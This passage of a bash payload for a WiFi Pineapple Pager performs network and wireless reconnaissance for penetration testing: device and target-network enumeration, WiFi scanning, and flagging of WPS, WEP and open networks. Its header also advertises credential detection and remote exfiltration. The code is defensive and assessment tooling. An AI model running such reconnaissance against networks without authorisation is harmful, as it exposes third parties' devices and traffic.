#!/bin/bash
#
# Title: Incident Response Forensic Collector
# Author: curtthecoder - github.com/curthayman
# Version: 2.2
# Category: Incident Response / Penetration Testing
# Description:   Comprehensive incident response payload that collects network
#                forensics, system state, connected clients, and traffic samples
#                for penetration testing and security assessments.
#
#                Enhanced with advanced features including:
#                - Client fingerprinting & OS detection
#                - Credential & sensitive data detection
#                - Service discovery (mDNS, NetBIOS, SNMP, UPnP, SMB)
#                - Advanced WiFi security analysis (WEP/WPS/encryption types)
#                - Deep packet analysis & protocol breakdown
#                - Rogue device detection
#                - Geolocation & physical security logging
#                - Timeline & historical analysis
#                - Archive encryption & remote exfiltration

# LED Configuration
LED SETUP

# Capture start time for elapsed time calculation
START_TIME=$(date +%s)

LOG "================================"
LOG "  INCIDENT RESPONSE COLLECTOR"
LOG "      by curtthecoder"
LOG "================================"
LOG ""

# Version check
CURRENT_VERSION="2.2"
VERSION_CHECK_URL="https://raw.githubusercontent.com/hak5/wifipineapplepager-payloads/master/library/user/incident_response/incident_scanner/VERSION"
ENABLE_UPDATE_CHECK=true  # Set to false to disable

if [ "$ENABLE_UPDATE_CHECK" = true ]; then
    LOG "yellow" "[*] Checking for updates..."

    # Fetch version file and HTTP status code
    HTTP_RESPONSE=$(timeout 3 curl -s -w "\n%{http_code}" "$VERSION_CHECK_URL" 2>/dev/null)
    HTTP_CODE=$(echo "$HTTP_RESPONSE" | tail -1)
    LATEST_VERSION=$(echo "$HTTP_RESPONSE" | head -1 | tr -d '[:space:]')

    # Check if request was successful (HTTP 200)
    if [ "$HTTP_CODE" = "200" ] && [ -n "$LATEST_VERSION" ]; then
        if [ "$LATEST_VERSION" != "$CURRENT_VERSION" ]; then
            LOG ""
            LOG "green" "========================================================"
            LOG "green" "  🆕 UPDATE AVAILABLE!"
            LOG "green" "  Current: v${CURRENT_VERSION} → Latest: v${LATEST_VERSION}"
            LOG "green" "  Update at: github.com/hak5/wifipineapplepager-payloads"
            LOG "green" "========================================================"
            LOG ""
            sleep 3
        else
            LOG "    [OK] Running latest version (v${CURRENT_VERSION})"
        fi
    else
        # File not found or network issue - assume running current version
        LOG "    [OK] Running current version (v${CURRENT_VERSION})"
    fi
fi
LOG ""

# Configuration
LOOT_DIR=/root/loot/incident_response
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

# ============================================================================
# SCAN LABEL (Interactive Prompt)
# ============================================================================
# Prompt user for a custom label to identify this scan
# Example: "office_breach", "client_site_a", "after_hours_scan"
# Leave empty for timestamp-only folder names

PROMPT "=== INCIDENT RESPONSE SCANNER ===\n\nEnter a label for this scan:\n(e.g., office_a, client_site, after_hours)\n\nLeave blank for timestamp-only name\n"
SCAN_LABEL=$(TEXT_PICKER "Scan label" "")

# ============================================================================
# SCAN TYPE SELECTION (Interactive Prompt)
# ============================================================================
# The user will be prompted to select scan type at runtime:
#
#   1. QUICK  (~1-5 min)   - Fast reconnaissance for rapid assessments
#                            System info, network config, WiFi scan, basic security
#                            Best for: Initial recon, time-sensitive situations
#
#   2. NORMAL (~10-15 min) - Balanced scan with good coverage
#                            Adds: Client fingerprinting, rogue detection, short
#                            traffic capture, credential scan, geolocation
#                            Best for: Standard penetration tests, most scenarios
#
#   3. DEEP   (~25+ min)   - Comprehensive forensic collection (full scan)
#                            Adds: Service discovery, wireless recon with monitor
#                            mode, Bluetooth scan, full WiFi security analysis,
#                            recon.db analysis, extended traffic capture
#                            Best for: Full incident response, detailed forensics

# Display scan type menu
PROMPT "Select scan type:\n\n1. QUICK  (~1-5 min)  - Fast recon\n2. NORMAL (~10-15 min) - Balanced scan\n3. DEEP   (~25+ min)  - Full forensics\n"

# Get user selection (default to DEEP scan)
SCAN_SELECTION=$(NUMBER_PICKER "Select scan type (1-3)" "1")

# Set SCAN_TYPE based on selection
case $SCAN_SELECTION in
    1) SCAN_TYPE="QUICK" ;;
    2) SCAN_TYPE="NORMAL" ;;
    3|*) SCAN_TYPE="DEEP" ;;
esac

LOG "[*] Selected: ${SCAN_TYPE} scan"

# ============================================================================
# SCAN TYPE CONFIGURATION (Auto-set based on SCAN_TYPE selection)
# ============================================================================
# These settings are automatically configured based on SCAN_TYPE above.
# You can override individual settings after this block if needed.

case "$SCAN_TYPE" in
    "QUICK"|"quick")
        SCAN_TYPE="QUICK"
        PCAP_TIME=0              # No traffic capture
        ENABLE_WIRELESS_RECON=false
        CHANNEL_HOP=false
        ENABLE_CREDENTIAL_SCAN=false
        ENABLE_SERVICE_DISCOVERY=false
        ENABLE_HISTORICAL_COMPARISON=false
        ENABLE_BLUETOOTH_SCAN=false
        ENABLE_RECON_DB_ANALYSIS=false
        ENABLE_WIFI_SECURITY_ANALYSIS=false
        ENABLE_CLIENT_FINGERPRINTING=false  # Basic only
        ENABLE_ROGUE_DETECTION=false
        ENABLE_GEOLOCATION=false
        SCAN_DURATION_MSG="1-5 minutes"
        ;;
    "NORMAL"|"normal")
        SCAN_TYPE="NORMAL"
        PCAP_TIME=30             # Short traffic capture
        ENABLE_WIRELESS_RECON=false
        CHANNEL_HOP=false
        ENABLE_CREDENTIAL_SCAN=true
        ENABLE_SERVICE_DISCOVERY=false
        ENABLE_HISTORICAL_COMPARISON=true
        ENABLE_BLUETOOTH_SCAN=false
        ENABLE_RECON_DB_ANALYSIS=false
        ENABLE_WIFI_SECURITY_ANALYSIS=false
        ENABLE_CLIENT_FINGERPRINTING=true
        ENABLE_ROGUE_DETECTION=true
        ENABLE_GEOLOCATION=true
        SCAN_DURATION_MSG="10-15 minutes"
        ;;
    "DEEP"|"deep"|*)
        SCAN_TYPE="DEEP"
        PCAP_TIME=120            # Full traffic capture
        ENABLE_WIRELESS_RECON=true
        CHANNEL_HOP=true
        ENABLE_CREDENTIAL_SCAN=true
        ENABLE_SERVICE_DISCOVERY=true
        ENABLE_HISTORICAL_COMPARISON=true
        ENABLE_BLUETOOTH_SCAN=true
        ENABLE_RECON_DB_ANALYSIS=true
        ENABLE_WIFI_SECURITY_ANALYSIS=true
        ENABLE_CLIENT_FINGERPRINTING=true
        ENABLE_ROGUE_DETECTION=true
        ENABLE_GEOLOCATION=true
        SCAN_DURATION_MSG="25+ minutes"
        ;;
esac

# Sanitize and build folder name
if [ -n "$SCAN_LABEL" ]; then
    # Replace spaces with underscores and remove special characters
    SANITIZED_LABEL=$(echo "$SCAN_LABEL" | tr '[:upper:]' '[:lower:]' | sed 's/[^a-z0-9_-]/_/g' | sed 's/__*/_/g' | sed 's/^_//;s/_$//')
    REPORT_DIR="${LOOT_DIR}/IR_${TIMESTAMP}_${SANITIZED_LABEL}"
else
    REPORT_DIR="${LOOT_DIR}/IR_${TIMESTAMP}"
fi

# ============================================================================
# CAPTURE SETTINGS (these can be overridden regardless of scan type)
# ============================================================================
PCAP_SNAPLEN=65535  # Full packet capture
PCAP_COUNT=10000  # Maximum packets per interface

# Wireless Reconnaissance Configuration (used when ENABLE_WIRELESS_RECON=true)
CHANNEL_HOP_INTERVAL=0.5  # Seconds per channel
RECON_PHY="auto"  # Physical device to use: "auto" to detect, or specify "phy0", "phy1", etc.
RECON_MON_NAME="recon0"  # Name for the monitor interface I'll create
CHANNELS_24GHZ="1 2 3 4 5 6 7 8 9 10 11"  # 2.4GHz channels
CHANNELS_5GHZ="36 40 44 48 52 56 60 64 100 104 108 112 116 120 124 128 132 136 140 144 149 153 157 161 165"  # 5GHz channels

# Recon Database Path
RECON_DB_PATH="/root/recon/recon.db"  # Path to recon.db (also checks /mmc/root/recon/recon.db)

# Archive & Remote Sync Configuration
ENABLE_REMOTE_SYNC=false  # Set to true and configure below for auto-upload
ENCRYPT_ARCHIVE=false  # Set to true to encrypt final archive

# Remote Sync Configuration (if ENABLE_REMOTE_SYNC=true)
REMOTE_SERVER=""  # e.g., user@server.com
REMOTE_PATH=""    # e.g., /remote/path/
REMOTE_METHOD="scp"  # scp or sftp

# Encryption Configuration (if ENCRYPT_ARCHIVE=true)
ENCRYPTION_PASSWORD=""  # Set strong password or leave empty for prompt

# Severity Scoring System
# CRITICAL (100 pts): Cleartext credentials, active attacks (deauth)
# HIGH (75 pts): WEP networks, rogue DHCP, duplicate IPs
# MEDIUM (50 pts): Open networks, WPS enabled, suspicious MACs
# LOW (25 pts): Hidden SSIDs, randomized MACs
SCORE_CRITICAL=0
SCORE_HIGH=0
SCORE_MEDIUM=0
SCORE_LOW=0
FINDINGS_CRITICAL=""
FINDINGS_HIGH=""
FINDINGS_MEDIUM=""
FINDINGS_LOW=""

# Function to record security findings with severity
add_finding() {
    local severity="$1"
    local finding="$2"
    case "$severity" in
        CRITICAL)
            SCORE_CRITICAL=$((SCORE_CRITICAL + 100))
            FINDINGS_CRITICAL="${FINDINGS_CRITICAL}  - ${finding}\n"
            ;;
        HIGH)
            SCORE_HIGH=$((SCORE_HIGH + 75))
            FINDINGS_HIGH="${FINDINGS_HIGH}  - ${finding}\n"
            ;;
        MEDIUM)
            SCORE_MEDIUM=$((SCORE_MEDIUM + 50))
            FINDINGS_MEDIUM="${FINDINGS_MEDIUM}  - ${finding}\n"
            ;;
        LOW)
            SCORE_LOW=$((SCORE_LOW + 25))
            FINDINGS_LOW="${FINDINGS_LOW}  - ${finding}\n"
            ;;
    esac
}

# MAC OUI Database (abbreviated - expand as needed)
declare -A MAC_OUI=(
    ["00:50:F2"]="Microsoft"
    ["00:0C:29"]="VMware"
    ["08:00:27"]="VirtualBox"
    ["F0:18:98"]="Apple"
    ["3C:37:86"]="Apple"
    ["A4:5E:60"]="Apple"
    ["00:1A:11"]="Google"
    ["54:60:09"]="Google"
    ["B4:F0:AB"]="Google"
    ["00:50:56"]="VMware"
    ["00:1B:63"]="Apple"
    ["28:CF:E9"]="Apple"
    ["00:03:93"]="Apple"
    ["E8:DE:27"]="TP-Link"
    ["50:C7:BF"]="TP-Link"
    ["00:0D:B9"]="Netgear"
    ["A0:63:91"]="Netgear"
    ["00:1F:33"]="Netgear"
    ["00:18:F8"]="Cisco"
    ["00:1E:BD"]="Cisco"
    ["00:24:13"]="Cisco"
    ["D8:EB:97"]="Raspberry Pi"
    ["B8:27:EB"]="Raspberry Pi"
    ["DC:A6:32"]="Raspberry Pi"
    ["00:16:EA"]="Intel"
    ["00:1B:21"]="Intel"
    ["D4:BE:D9"]="Intel"
    ["70:85:C2"]="Rivet Networks"
    ["00:E0:4C"]="Realtek"
    ["52:54:00"]="QEMU"
    ["00:FF:"]="Unknown/Random"
)

LOG "[+] Initializing..."
LOG ""
LOG "================================"
case "$SCAN_TYPE" in
    "QUICK")
        LOG "SCAN TYPE: QUICK (~1-5 min)"
        ;;
    "NORMAL")
	      LOG "SCAN TYPE: NORMAL (~10-15 min)"
        ;;
    "DEEP")
        LOG "SCAN TYPE: DEEP (~25+ min)"
        ;;
esac
LOG "================================"
LOG ""
LOG "[!] NOTE: Estimated scan duration is ${SCAN_DURATION_MSG}."
LOG "    Please do not interrupt the process."
LOG ""
LOG "[+] Timestamp: ${TIMESTAMP}"
LOG "[+] Scan Type: ${SCAN_TYPE}"
if [ -n "$SCAN_LABEL" ]; then
    LOG "[+] Scan Label: ${SANITIZED_LABEL}"
fi
LOG "[+] Report Directory: ${REPORT_DIR}"

# Create directory structure
mkdir -p "${REPORT_DIR}"/{network,system,wireless,pcaps,logs,analysis,credentials,services,timeline,bluetooth}
LOG "[+] Created report directory"
LOG ""

# ============================================================================
# INTERFACE CHECK - Warn if not connected to target WiFi
# ============================================================================
# Check if wlan1 or wlan0 are in managed mode (connected to target network)
# If only wlan0cli is available, the pager is using its upstream/management
# interface which means limited scan results (no internal network visibility)

CONNECTED_TO_TARGET=false
for check_iface in wlan1 wlan0 wlan0cli; do
    if iw dev "$check_iface" info 2>/dev/null | grep -q "type managed"; then
        # Check if this interface actually has an IP (connected to a network)
        if ip addr show "$check_iface" 2>/dev/null | grep -q "inet "; then
            CONNECTED_TO_TARGET=true
            SCAN_INTERFACE_NAME="$check_iface"
            break
        fi
    fi
done

if [ "$CONNECTED_TO_TARGET" = false ]; then
    LOG ""
    LOG "yellow" "========================================================"
    LOG "yellow" "  WARNING: NOT CONNECTED TO TARGET WIFI"
    LOG "yellow" "========================================================"
    LOG "yellow" "  You are scanning via the pager's management interface"
    LOG "yellow" "  (wlan0cli) which provides LIMITED visibility."
    LOG "yellow" ""
    LOG "yellow" "  You will MISS:"
    LOG "yellow" "    - Internal network client enumeration"
    LOG "yellow" "    - Connected device fingerprinting"
    LOG "yellow" "    - Internal traffic capture & credentials"
    LOG "yellow" "    - Rogue device detection on the LAN"
    LOG "yellow" "    - Service discovery (mDNS, NetBIOS, SMB)"
    LOG "yellow" "    - Deep packet analysis of target traffic"
    LOG "yellow" ""
    LOG "yellow" "  For full results, connect to the target WiFi first:"
    LOG "yellow" "    Networking > WiFi Client Mode > Connect"
    LOG "yellow" "========================================================"
    LOG ""
    sleep 5
fi

# ============================================================================
# HELPER FUNCTIONS
# ============================================================================

# MAC OUI Lookup Function
lookup_mac_vendor() {
    local mac=$1
    local oui=$(echo "$mac" | tr '[:lower:]' '[:upper:]' | cut -d':' -f1-3)

    if [ -n "${MAC_OUI[$oui]}" ]; then
        echo "${MAC_OUI[$oui]}"
    else
        echo "Unknown"
    fi
}

# OS Detection from TTL
detect_os_from_ttl() {
    local ttl=$1
    if [ "$ttl" -ge 60 ] && [ "$ttl" -le 64 ]; then
        echo "Linux/Unix"
    elif [ "$ttl" -ge 120 ] && [ "$ttl" -le 128 ]; then
        echo "Windows"
    elif [ "$ttl" -ge 250 ] && [ "$ttl" -le 255 ]; then
        echo "Cisco/Network Device"
    else
        echo "Unknown (TTL: $ttl)"
    fi
}

# Check if tool exists
check_tool() {
    command -v "$1" >/dev/null 2>&1
}

LED ATTACK

# ============================================================================
# SYSTEM INFORMATION COLLECTION
# ============================================================================

LOG "[*] Collecting scanning device & target environment info..."

# Scanning device details (chain-of-custody / forensic context)
{
    echo "=== SCANNING DEVICE INFORMATION ==="
    echo "Purpose: Documents the device used to perform this scan"
    echo "         (for forensic chain-of-custody and resource awareness)"
    echo ""
    echo "Timestamp: $(date)"
    echo "Hostname: $(hostname)"
    echo "Uptime: $(uptime)"
    echo ""
    echo "=== KERNEL INFO ==="
    uname -a
    echo ""
    echo "=== MEMORY INFO ==="
    free -h
    echo ""
    echo "=== DISK USAGE ==="
    df -h
    echo ""
    echo "=== RUNNING PROCESSES ==="
    ps aux
} > "${REPORT_DIR}/system/scanner_device.txt"
LOG "    [OK] Scanner device info saved"

# Target network environment details (the actual pen test intel)
{
    echo "=== TARGET NETWORK ENVIRONMENT ==="
    echo "Purpose: Network environment the Pager is connected to / scanning"
    echo "Timestamp: $(date)"
    echo ""

    # Connected WiFi network
    echo "=== CONNECTED WIFI NETWORK ==="
    CONNECTED_SSID=""
    for iface in wlan1 wlan0; do
        ssid_info=$(iw dev "$iface" link 2>/dev/null)
        if echo "$ssid_info" | grep -q "Connected to"; then
            CONNECTED_SSID=$(echo "$ssid_info" | grep "SSID:" | awk '{print $2}')
            echo "  Interface: $iface"
            echo "$ssid_info" | sed 's/^/  /'
            echo ""
            break
        fi
    done
    if [ -z "$CONNECTED_SSID" ]; then
        echo "  [!] Not connected to a target WiFi network"
        echo "  [!] Scanning via management interface (wlan0cli) - limited visibility"
        echo ""
    fi

    # Default gateway (target network's router)
    echo "=== DEFAULT GATEWAY ==="
    GW_IP=$(ip route | grep default | awk '{print $3}' | head -1)
    GW_IFACE=$(ip route | grep default | awk '{print $5}' | head -1)
    if [ -n "$GW_IP" ]; then
        echo "  Gateway IP: $GW_IP"
        echo "  Via Interface: $GW_IFACE"
        # Try to get gateway MAC
        GW_MAC=$(arp -a 2>/dev/null | grep "$GW_IP" | grep -oE '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}' | head -1)
        if [ -n "$GW_MAC" ]; then
            echo "  Gateway MAC: $GW_MAC"
            GW_VENDOR=$(lookup_mac_vendor "$GW_MAC")
            echo "  Gateway Vendor: $GW_VENDOR"
        fi
        # Ping gateway to check latency
        GW_PING=$(ping -c 3 -W 2 "$GW_IP" 2>/dev/null | tail -1)
        if [ -n "$GW_PING" ]; then
            echo "  Latency: $GW_PING"
        fi
    else
        echo "  [!] No default gateway found"
    fi
    echo ""

    # IP addressing & subnet
    echo "=== IP ADDRESSING & SUBNET ==="
    for iface in wlan1 wlan0 wlan0cli br-lan eth0; do
        IFACE_IP=$(ip addr show "$iface" 2>/dev/null | grep "inet " | awk '{print $2}')
        if [ -n "$IFACE_IP" ]; then
            echo "  $iface: $IFACE_IP"
        fi
    done
    echo ""

    # DHCP information (what the target network assigned us)
    echo "=== DHCP LEASE INFORMATION ==="
    if [ -f /tmp/dhcp.leases ]; then
        echo "  Active DHCP leases on this network:"
        while read -r expire mac ip hostname clientid; do
            vendor=$(lookup_mac_vendor "$mac")
            echo "    IP: $ip | MAC: $mac | Vendor: $vendor | Hostname: ${hostname:--} | Expires: $(date -d @"$expire" 2>/dev/null || echo "$expire")"
        done < /tmp/dhcp.leases
    else
        echo "  No DHCP lease file found at /tmp/dhcp.leases"
    fi
    # Check for udhcpc lease info
    for lease_file in /var/run/udhcpc-*.info /tmp/udhcpc-*.info; do
        if [ -f "$lease_file" 2>/dev/null ]; then
            echo ""
            echo "  DHCP client lease ($lease_file):"
            grep -E "^(ip|subnet|router|dns|domain|serverid|lease)" "$lease_file" 2>/dev/null | sed 's/^/    /'
        fi
    done
    echo ""

    # DNS servers (reveals target network's DNS infrastructure)
    echo "=== DNS SERVERS ==="
    if [ -f /tmp/resolv.conf.d/resolv.conf.auto ]; then
        grep "nameserver" /tmp/resolv.conf.d/resolv.conf.auto | sed 's/^/  /'
    elif [ -f /tmp/resolv.conf ]; then
        grep "nameserver" /tmp/resolv.conf | sed 's/^/  /'
    elif [ -f /etc/resolv.conf ]; then
        grep "nameserver" /etc/resolv.conf | sed 's/^/  /'
    else
        echo "  [!] No DNS configuration found"
    fi
    echo ""

    # Network neighbors (devices on the target network)
    echo "=== NETWORK NEIGHBORS (ARP) ==="
    echo "  Devices discovered on this network segment:"
    ip neigh show 2>/dev/null | while read -r line; do
        neighbor_ip=$(echo "$line" | awk '{print $1}')
        neighbor_mac=$(echo "$line" | grep -oE '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}')
        neighbor_state=$(echo "$line" | awk '{print $NF}')
        if [ -n "$neighbor_mac" ]; then
            vendor=$(lookup_mac_vendor "$neighbor_mac")
            echo "    $neighbor_ip | $neighbor_mac | $vendor | State: $neighbor_state"
        fi
    done
    echo ""

    # Listening services on the network (from the Pager's perspective)
    echo "=== ACTIVE OUTBOUND CONNECTIONS ==="
    echo "  Connections from this device to the target network:"
    netstat -tunp 2>/dev/null | grep -E "ESTABLISHED|SYN_SENT" | sed 's/^/    /' || \
        ss -tunp 2>/dev/null | grep -E "ESTAB|SYN-SENT" | sed 's/^/    /'
    echo ""

} > "${REPORT_DIR}/system/target_environment.txt"
LOG "    [OK] Target environment info saved"

# Network configuration
{
    echo "=== NETWORK INTERFACES ==="
    ifconfig -a
    echo ""
    echo "=== IP ADDRESSES ==="
    ip addr show
    echo ""
    echo "=== ROUTING TABLE ==="
    ip route show
    route -n
    echo ""
    echo "=== ARP CACHE ==="
    arp -a
    ip neigh show
} > "${REPORT_DIR}/network/network_config.txt"
LOG "    [OK] Network config saved"

# ============================================================================
# ACTIVE CONNECTION ANALYSIS
# ============================================================================

LOG "[*] Analyzing active connections..."

{
    echo "=== ACTIVE CONNECTIONS ==="
    netstat -tunapl 2>/dev/null || ss -tunapl
    echo ""
    echo "=== LISTENING SERVICES ==="
    netstat -tlnp 2>/dev/null || ss -tlnp
    echo ""
    echo "=== CONNECTION SUMMARY ==="
    netstat -s 2>/dev/null || ss -s
} > "${REPORT_DIR}/network/connections.txt"
LOG "    [OK] Connections logged"

# DNS information
{
    echo "=== DNS CONFIGURATION ==="
    cat /etc/resolv.conf 2>/dev/null
    echo ""
    echo "=== HOSTS FILE ==="
    cat /etc/hosts 2>/dev/null
} > "${REPORT_DIR}/network/dns_info.txt"
LOG "    [OK] DNS info saved"

# ============================================================================
# WIRELESS NETWORK ANALYSIS
# ============================================================================

LOG "[*] Scanning wireless environment..."

# Wireless interfaces
{
    echo "=== WIRELESS INTERFACES ==="
    iw dev
    echo ""
    echo "=== WIRELESS CONFIGURATION ==="
    for iface in $(iw dev | grep Interface | awk '{print $2}'); do
        echo "--- Interface: $iface ---"
        iw dev "$iface" info
        iw dev "$iface" station dump 2>/dev/null
        echo ""
    done
} > "${REPORT_DIR}/wireless/wireless_info.txt"
LOG "    [OK] Wireless interfaces logged"

# WiFi scan - try multiple methods to find nearby networks
{
    echo "=== NEARBY NETWORKS ==="

    # Find a managed interface for scanning
    SCAN_IFACE=""
    for try_iface in wlan1 wlan0 wlan0cli; do
        if iw dev "$try_iface" info 2>/dev/null | grep -q "type managed"; then
            SCAN_IFACE="$try_iface"
            break
        fi
    done

    # Fallback: any managed interface
    if [ -z "$SCAN_IFACE" ]; then
        for iface in $(iw dev | grep Interface | awk '{print $2}'); do
            if iw dev "$iface" info 2>/dev/null | grep -q "type managed"; then
                SCAN_IFACE="$iface"
                break
            fi
        done
    fi

    scan_success=false

    if [ -n "$SCAN_IFACE" ]; then
        echo "--- Scanning on $SCAN_IFACE ---"
        echo ""

        # Method 1: Try iw scan (with trigger first)
        iw dev "$SCAN_IFACE" scan trigger 2>/dev/null
        sleep 2
        scan_result=$(iw dev "$SCAN_IFACE" scan dump 2>/dev/null)
        if [ -z "$scan_result" ]; then
            # Fallback to regular scan
            scan_result=$(iw dev "$SCAN_IFACE" scan 2>/dev/null)
        fi

        if [ -n "$scan_result" ] && echo "$scan_result" | grep -q "SSID"; then
            echo "$scan_result" | grep -E "SSID|signal|capability|freq"
            scan_success=true
        fi

        # Method 2: Try iwlist if iw failed
        if [ "$scan_success" = false ] && check_tool iwlist; then
            scan_result=$(iwlist "$SCAN_IFACE" scan 2>/dev/null)
            if [ -n "$scan_result" ] && echo "$scan_result" | grep -q "ESSID"; then
                echo "$scan_result" | grep -E "ESSID|Signal|Encryption|Frequency"
                scan_success=true
            fi
        fi

        # Method 3: Try ubus (OpenWrt native) if others failed
        if [ "$scan_success" = false ] && check_tool ubus; then
            scan_result=$(ubus call iwinfo scan '{"device":"'"$SCAN_IFACE"'"}' 2>/dev/null)
            if [ -n "$scan_result" ] && [ "$scan_result" != "{}" ] && [ "$scan_result" != "{ }" ]; then
                echo "$scan_result"
                scan_success=true
            fi
        fi

        if [ "$scan_success" = false ]; then
            echo "[!] Scan returned no results on $SCAN_IFACE"
            echo ""
            echo "This can happen when:"
            echo "  - The radio is busy (AP mode active on same phy)"
            echo "  - Scan is being rate-limited"
            echo ""
        fi
    else
        echo "[!] No interface in managed mode available for scanning."
    fi
    echo ""
} > "${REPORT_DIR}/wireless/wifi_scan.txt"

# Count nearby networks
NETWORK_COUNT=$(grep "SSID:" "${REPORT_DIR}/wireless/wifi_scan.txt" | wc -l)
LOG "    [OK] Found ${NETWORK_COUNT} nearby networks"

# Advanced WiFi Security Analysis
LOG "[*] Analyzing WiFi security posture..."

{
    echo "=== ADVANCED WIFI SECURITY ANALYSIS ==="
    echo "Timestamp: $(date)"
    echo ""

    # Find best interface for detailed scan
    SCAN_IFACE=""

    for try_iface in wlan1 wlan0 wlan0cli; do
        if iw dev "$try_iface" info 2>/dev/null | grep -q "type managed"; then
            SCAN_IFACE="$try_iface"
            break
        fi
    done

    if [ -z "$SCAN_IFACE" ]; then
        for iface in $(iw dev | grep Interface | awk '{print $2}'); do
            if iw dev "$iface" info 2>/dev/null | grep -q "type managed"; then
                SCAN_IFACE="$iface"
                break
            fi
        done
    fi

    if [ -n "$SCAN_IFACE" ]; then
        echo "=== Interface: $SCAN_IFACE ==="
        echo ""

        # Full scan with detailed security info - try multiple methods
        # Method 1: iw scan with trigger
        iw dev "$SCAN_IFACE" scan trigger 2>/dev/null
        sleep 2
        iw dev "$SCAN_IFACE" scan dump 2>/dev/null > /tmp/wifi_detailed_scan.txt

        # If empty, try regular iw scan
        if [ ! -s /tmp/wifi_detailed_scan.txt ]; then
            iw dev "$SCAN_IFACE" scan 2>/dev/null > /tmp/wifi_detailed_scan.txt
        fi

        # Method 2: If still empty, try iwlist and convert format
        if [ ! -s /tmp/wifi_detailed_scan.txt ] && check_tool iwlist; then
            iwlist "$SCAN_IFACE" scan 2>/dev/null > /tmp/wifi_detailed_scan.txt
        fi

        # Parse for security vulnerabilities
        echo "--- SECURITY ASSESSMENT ---"
        echo ""

        # Parse networks properly with Python/awk for accurate results
        # Create temporary analysis script
        cat > /tmp/analyze_networks.awk << 'AWKEOF'
BEGIN {
    bss=""; ssid=""; signal=""; cap="";
    wpa=0; wpa2=0; wpa3=0; wep=0; open=0;
}
/^BSS / {
    if (bss != "") process_network();
    bss=$2; ssid=""; signal=""; cap="";
    has_privacy=0; is_wep=0; is_wpa=0; is_wpa2=0; is_wpa3=0;
}
/SSID:/ {
    ssid=$0;
    gsub(/^[[:space:]]*SSID: /, "", ssid);
}
/signal:/ {
    signal=$2" "$3;
}
/capability:.*Privacy/ {
    has_privacy=1;
    cap=$0;
}
/capability:/ && !/Privacy/ {
    cap=$0;
}
/Group cipher: WEP/ || /Pairwise ciphers:.*WEP/ {
    is_wep=1;
}
/WPA:/ && !/WPA2/ && !/WPA3/ {
    is_wpa=1;
}
/RSN:/ || /WPA2:/ {
    is_wpa2=1;
}
/WPA3:/ {
    is_wpa3=1;
}
END {
    if (bss != "") process_network();
}
function process_network() {
    if (ssid == "") ssid="<hidden>";

    # Determine encryption type
    enc_type="Unknown";
    if (is_wpa3) {
        enc_type="WPA3";
    } else if (is_wpa2) {
        enc_type="WPA2";
    } else if (is_wpa) {
        enc_type="WPA";
    } else if (is_wep) {
        enc_type="WEP";
    } else if (!has_privacy) {
        enc_type="Open";
    } else if (has_privacy && !is_wpa && !is_wpa2 && !is_wpa3 && !is_wep) {
        enc_type="WPA/WPA2";  # Privacy flag set but no specific protocol detected
    }

    print bss "|" ssid "|" signal "|" enc_type;
}
AWKEOF

        # Parse the scan results
        awk -f /tmp/analyze_networks.awk /tmp/wifi_detailed_scan.txt > /tmp/parsed_networks.txt

        # WPS-enabled networks (potential vulnerability)
        echo "** WPS-ENABLED NETWORKS (Potential WPS PIN Attack) **"
        grep -B 15 "WPS:" /tmp/wifi_detailed_scan.txt | grep -E "^BSS|SSID:" | while read line; do
            if echo "$line" | grep -q "^BSS"; then
                current_bss=$(echo "$line" | awk '{print $2}')
            elif echo "$line" | grep -q "SSID:"; then
                current_ssid=$(echo "$line" | sed 's/.*SSID: //')
                # Check if this network actually has WPS
                wps_check=$(grep -A 15 "$current_bss" /tmp/wifi_detailed_scan.txt | grep "WPS:")
                if [ -n "$wps_check" ]; then
                    signal=$(grep "$current_bss" /tmp/parsed_networks.txt | cut -d'|' -f3)
                    echo "  SSID: $current_ssid | MAC: $current_bss | Signal: $signal"
                fi
            fi
        done
        WPS_COUNT=$(grep -c "WPS:" /tmp/wifi_detailed_scan.txt 2>/dev/null); WPS_COUNT=${WPS_COUNT:-0}
        echo "  Total WPS-enabled: $WPS_COUNT"
        echo ""

        # Open networks (no encryption)
        echo "** OPEN NETWORKS (No Encryption - HIGHEST RISK) **"
        grep "Open$" /tmp/parsed_networks.txt | while IFS='|' read bss ssid signal enc; do
            echo "  SSID: $ssid | Signal: $signal | MAC: $bss"
        done
        OPEN_COUNT=$(grep -c "Open$" /tmp/parsed_networks.txt 2>/dev/null); OPEN_COUNT=${OPEN_COUNT:-0}
        echo "  Total open networks: $OPEN_COUNT"
        echo ""

        # WEP networks (deprecated/weak encryption)
        echo "** WEP NETWORKS (Deprecated - Easily Crackable) **"
        grep "WEP$" /tmp/parsed_networks.txt | while IFS='|' read bss ssid signal enc; do
            echo "  SSID: $ssid | Signal: $signal | MAC: $bss"
        done
        WEP_COUNT=$(grep -c "WEP$" /tmp/parsed_networks.txt 2>/dev/null); WEP_COUNT=${WEP_COUNT:-0}
        echo "  Total WEP networks: $WEP_COUNT"
        echo ""

        # Encryption type breakdown
        echo "** ENCRYPTION TYPE ANALYSIS **"
        WPA3_COUNT=$(grep -c "WPA3$" /tmp/parsed_networks.txt 2>/dev/null); WPA3_COUNT=${WPA3_COUNT:-0}
        WPA2_COUNT=$(grep -c "WPA2$\|WPA/WPA2$" /tmp/parsed_networks.txt 2>/dev/null); WPA2_COUNT=${WPA2_COUNT:-0}
        WPA_COUNT=$(grep -c "WPA$" /tmp/parsed_networks.txt 2>/dev/null); WPA_COUNT=${WPA_COUNT:-0}

        echo "  WPA3 (modern):     $WPA3_COUNT"
        echo "  WPA2/Mixed:        $WPA2_COUNT"
        echo "  WPA (legacy):      $WPA_COUNT"
        echo "  WEP (deprecated):  $WEP_COUNT"
        echo "  Open (none):       $OPEN_COUNT"
        echo ""

        # Show all networks with encryption details
        echo "** ALL NETWORKS WITH ENCRYPTION STATUS **"
        echo ""
        while IFS='|' read bss ssid signal enc; do
            # Color code by risk level (in text)
            risk=""
            case "$enc" in
                "Open") risk="[HIGH RISK]" ;;
                "WEP") risk="[HIGH RISK]" ;;
                "WPA") risk="[MEDIUM RISK]" ;;
                "WPA2"|"WPA/WPA2") risk="[LOW RISK]" ;;
                "WPA3") risk="[SECURE]" ;;
                *) risk="[UNKNOWN]" ;;
            esac
            echo "  $risk $enc | SSID: $ssid | Signal: $signal | MAC: $bss"
        done < /tmp/parsed_networks.txt | sort
        echo ""

        # Cleanup
        rm -f /tmp/analyze_networks.awk /tmp/parsed_networks.txt

        # Channel congestion analysis
        echo "** CHANNEL UTILIZATION **"
